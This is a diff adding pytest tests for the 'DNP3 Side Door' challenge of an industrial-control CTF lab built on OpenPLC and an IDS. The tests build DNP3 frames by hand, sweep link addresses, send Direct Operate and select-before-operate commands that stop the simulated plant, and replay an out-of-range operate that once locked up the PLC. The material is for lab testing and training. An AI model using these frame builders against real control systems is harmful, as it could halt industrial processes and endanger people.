@@ -519,6 +519,285 @@ class TestS7SideDoor(_CtfProgress):
         assert self._modbus_words() == (0, 0), "stop and manual are not back to 0"
 
 
+DNP3_PORT = 20000
+DNP3_OUTSTATION = 10     # OpenPLC dnp3.cfg local_address
+DNP3_MASTER = 1          # dnp3.cfg remote_address
+DNP3_STOP_INDEX = 1128   # analog output 1024 + 104 -> %MW104
+
+
+def _dnp3_crc(data):
+    crc = 0
+    for byte in data:
+        crc ^= byte
+        for _ in range(8):
+            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
+    return (~crc & 0xFFFF).to_bytes(2, "little")
+
+
+def _dnp3_link_frame(control, dest, source, user=b""):
+    header = bytes([0x05, 0x64, 5 + len(user), control]) + dest.to_bytes(2, "little") \
+        + source.to_bytes(2, "little")
+    frame = header + _dnp3_crc(header)
+    for i in range(0, len(user), 16):
+        block = user[i:i + 16]
+        frame += block + _dnp3_crc(block)
+    return frame
+
+
+def _dnp3_operate_stop(value):
+    """A Direct Operate on Analog Output Int16 1128, built independently of the solution."""
+    import struct
+    user = bytes([0xC0, 0xC1, 0x05, 41, 2, 0x28]) + struct.pack("<HHhB", 1, DNP3_STOP_INDEX, value, 0)
+    return _dnp3_link_frame(0xC4, DNP3_OUTSTATION, DNP3_MASTER, user)
+
+
+def _dnp3_ao_request(func, value, seq=1, dest=DNP3_OUTSTATION, source=DNP3_MASTER):
+    """A control request on Analog Output Int16 1128 with function code and app sequence."""
+    import struct
+    user = bytes([0xC0, 0xC0 | seq, func, 41, 2, 0x28]) \
+        + struct.pack("<HHhB", 1, DNP3_STOP_INDEX, value, 0)
+    return _dnp3_link_frame(0xC4, dest, source, user)
+
+
+def _dnp3_control_status(reply):
+    """The control status the outstation echoed for the (single) point, or None."""
+    if len(reply) < 10 or reply[:2] != b"\x05\x64":
+        return None
+    size = reply[2] - 5
+    user, pos = b"", 10
+    while len(user) < size and pos < len(reply):
+        take = min(16, size - len(user))
+        user += reply[pos:pos + take]
+        pos += take + 2
+    if len(user) < 6 or user[2] != 0x81:
+        return None
+    return user[-1]
+
+
+def _dnp3_send(frame, timeout=3.0):
+    """Send a DNP3 frame to the PLC's outstation and return the raw reply."""
+    import socket
+    with socket.create_connection((SERVER_IP, DNP3_PORT), timeout=timeout) as sock:
+        sock.sendall(frame)
+        sock.settimeout(timeout)
+        try:
+            return sock.recv(1024)
+        except socket.timeout:
+            return b""
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestDnp3SideDoor(_CtfProgress):
+    """
+    The DNP3 Side Door challenge end to end: stop the plant with a hand-built
+    DNP3 Direct Operate to OpenPLC's outstation on port 20000, see the IDS name
+    the command, get the flag from the landing verify route, and restore the
+    plant.
+
+    Before the real solve it replays the hole the newest-alert rule closes: a
+    DNP3 stop, a DNP3 restore, then a stop over Modbus. Verify must refuse that.
+
+    The plant is restored in a finally block whatever fails, over DNP3 so the
+    newest dnp3_operate alert for the stop flag writes 0 and does not pre-arm
+    the challenge for anyone. The board's CTF progress is saved and restored
+    around the test the same way TestS7SideDoor does it.
+
+    An out-of-range operate (index 3000) is sent once and the plant checked
+    afterwards: the OpenPLC fork's dnp3.cpp bounds check must keep the lock
+    from freezing Modbus for every other challenge.
+    """
+
+    BASE = f"http://{SERVER_IP}:{NGINX_PROXY_PORT}"
+    IDS = f"http://{SERVER_IP}:{IDS_PORT}"
+
+    @staticmethod
+    def _modbus_words():
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        try:
+            assert client.connect(), "Modbus not reachable to check the plant state"
+            result = modbus_call(client, client.read_holding_registers, STOP_REGISTER, count=3)
+            assert not result.isError(), result
+            return result.registers[0], result.registers[2]
+        finally:
+            client.close()
+
+    @staticmethod
+    def _modbus_write_stop(value):
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        try:
+            assert client.connect(), "Modbus not reachable to write the stop flag"
+            result = modbus_call(client, client.write_register, STOP_REGISTER, value)
+            assert not result.isError(), result
+        finally:
+            client.close()
+
+    def _verify(self):
+        r = requests.post(f"{self.BASE}/ctf/verify/dnp3_sidedoor", json={}, timeout=30)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def _ids_last_alert_id(self):
+        alerts = requests.get(f"{self.IDS}/api/alerts", timeout=READ_TIMEOUT).json()["alerts"]
+        return max((a["id"] for a in alerts), default=0)
+
+    def _wait_for_stop_alert(self, since_id, value, timeout=10):
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            alerts = requests.get(f"{self.IDS}/api/alerts", params={"since_id": since_id},
+                                  timeout=READ_TIMEOUT).json()["alerts"]
+            hits = [a for a in alerts if a["rule"] == "dnp3_operate"
+                    and a.get("dst") == "172.18.0.3" and a.get("dport") == DNP3_PORT
+                    and any(o.get("index") == DNP3_STOP_INDEX and o.get("value") == value
+                            for req in a.get("dnp3", []) for o in req.get("objects", []))]
+            if hits:
+                return hits[-1]
+            time.sleep(0.5)
+        return None
+
+    def test_address_sweep_finds_the_outstation(self):
+        """The outstation answers only its own link address from the master it expects."""
+        answered = {}
+        for dest in (DNP3_OUTSTATION, DNP3_OUTSTATION + 1):
+            for source in (DNP3_MASTER, DNP3_MASTER + 1):
+                reply = _dnp3_send(_dnp3_link_frame(0xC9, dest, source))
+                answered[(dest, source)] = bool(reply)
+        assert answered[(DNP3_OUTSTATION, DNP3_MASTER)], "the right address pair got no reply"
+        assert not any(v for k, v in answered.items() if k != (DNP3_OUTSTATION, DNP3_MASTER)), \
+            f"a wrong address pair answered: {answered}"
+
+    def test_out_of_range_operate_does_not_freeze_the_plant(self):
+        """The critic's hazard: one out-of-range operate used to hold a lock forever."""
+        import struct
+        user = bytes([0xC0, 0xC1, 0x05, 41, 2, 0x28]) + struct.pack("<HHhB", 1, 3000, 1, 0)
+        _dnp3_send(_dnp3_link_frame(0xC4, DNP3_OUTSTATION, DNP3_MASTER, user))
+        time.sleep(1)
+        # Modbus must still answer; a held bufferLock would hang this read.
+        assert self._modbus_words()[0] == 0, "the plant changed or Modbus hung after an out-of-range operate"
+
+    def test_stop_over_dnp3_is_detected_and_verified_then_restored(self):
+        before = self._without("dnp3_sidedoor")
+        try:
+            self._stop_verify_restore()
+        finally:
+            self._restore(before)
+
+    def _stop_verify_restore(self):
+        status = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()
+        was_active = status.get("active", False)
+        if not was_active:
+            requests.post(f"{self.IDS}/api/start", timeout=READ_TIMEOUT)
+            time.sleep(2)
+
+        try:
+            assert self._modbus_words() == (0, 0), "the plant was not in automatic before the test"
+
+            # A running plant does not pass.
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+
+            # The hole the newest-alert rule closes: DNP3 stop, DNP3 restore,
+            # then a stop by Modbus. The newest DNP3 operate on the flag is 0.
+            _dnp3_send(_dnp3_operate_stop(1))
+            _dnp3_send(_dnp3_operate_stop(0))
+            time.sleep(2)
+            self._modbus_write_stop(1)
+            assert self._modbus_words()[0] == 1
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+            assert "put 0 back" in json.dumps(result["checks"]), result
+            self._modbus_write_stop(0)
+
+            # The attack: one DNP3 Direct Operate of 1 to index 1128.
+            before_id = self._ids_last_alert_id()
+            reply = _dnp3_send(_dnp3_operate_stop(1))
+            assert reply, "the outstation did not answer the operate"
+            assert self._modbus_words()[0] == 1, "the DNP3 operate did not reach %MW104"
+
+            alert = self._wait_for_stop_alert(before_id, 1)
+            assert alert is not None, "the IDS logged no dnp3_operate setting the stop flag"
+            request = alert["dnp3"][0]
+            assert request["link_dst"] == DNP3_OUTSTATION and request["link_src"] == DNP3_MASTER
+
+            result = self._verify()
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            # Restore over DNP3 so the newest dnp3_operate for the flag is a 0.
+            _dnp3_send(_dnp3_operate_stop(0))
+            self._modbus_write_stop(0)
+            if not was_active:
+                requests.post(f"{self.IDS}/api/stop", timeout=READ_TIMEOUT)
+
+        assert self._modbus_words() == (0, 0), "stop is not back to 0"
+
+    def test_frames_the_outstation_refuses_earn_nothing(self):
+        """The IDS logs requests; verify must credit only what the PLC carried out.
+
+        For each frame the outstation refuses or drops -- an OPERATE without a
+        SELECT (status 02 NO_SELECT), a Direct Operate to the wrong link
+        address, one with a broken CRC -- %MW104 must stay 0, and a Modbus stop
+        afterwards must not earn the flag. Then select-before-operate, which
+        the outstation does carry out, must.
+        """
+        before = self._without("dnp3_sidedoor")
+        try:
+            self._refused_then_select_before_operate()
+        finally:
+            self._restore(before)
+
+    def _refused_then_select_before_operate(self):
+        import socket
+        status = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()
+        was_active = status.get("active", False)
+        if not was_active:
+            requests.post(f"{self.IDS}/api/start", timeout=READ_TIMEOUT)
+            time.sleep(2)
+
+        bad_crc = bytearray(_dnp3_operate_stop(1))
+        bad_crc[-1] ^= 0xFF
+        refused = {
+            "operate-without-select": _dnp3_ao_request(0x04, 1),
+            "wrong-outstation": _dnp3_ao_request(0x05, 1, dest=DNP3_OUTSTATION + 1),
+            "bad-crc": bytes(bad_crc),
+        }
+        try:
+            assert self._modbus_words() == (0, 0), "the plant was not in automatic before the test"
+            for label, frame in refused.items():
+                reply = _dnp3_send(frame)
+                if label == "operate-without-select":
+                    code = _dnp3_control_status(reply)
+                    assert code not in (None, 0), f"the outstation accepted a lone OPERATE: {reply.hex()}"
+                else:
+                    assert not reply, f"{label}: the outstation answered {reply.hex()}"
+                time.sleep(1)
+                assert self._modbus_words()[0] == 0, f"{label}: the refused frame wrote %MW104"
+                self._modbus_write_stop(1)
+                result = self._verify()
+                assert not result["success"] and "flag" not in result, (label, result)
+                self._modbus_write_stop(0)
+
+            # Select-before-operate in one connection: SELECT seq 2, OPERATE seq 3.
+            before_id = self._ids_last_alert_id()
+            with socket.create_connection((SERVER_IP, DNP3_PORT), timeout=3) as sock:
+                sock.settimeout(3)
+                sock.sendall(_dnp3_ao_request(0x03, 1, seq=2))
+                assert _dnp3_control_status(sock.recv(1024)) == 0, "SELECT refused"
+                sock.sendall(_dnp3_ao_request(0x04, 1, seq=3))
+                assert _dnp3_control_status(sock.recv(1024)) == 0, "OPERATE after SELECT refused"
+            assert self._modbus_words()[0] == 1, "select-before-operate did not reach %MW104"
+            assert self._wait_for_stop_alert(before_id, 1) is not None
+            result = self._verify()
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            _dnp3_send(_dnp3_operate_stop(0))
+            self._modbus_write_stop(0)
+            if not was_active:
+                requests.post(f"{self.IDS}/api/stop", timeout=READ_TIMEOUT)
+
+        assert self._modbus_words() == (0, 0), "stop is not back to 0"
+
+
 # ===============================================================================
 # Forged HMI Token / Rotate the FUXA Token Key
 # ===============================================================================
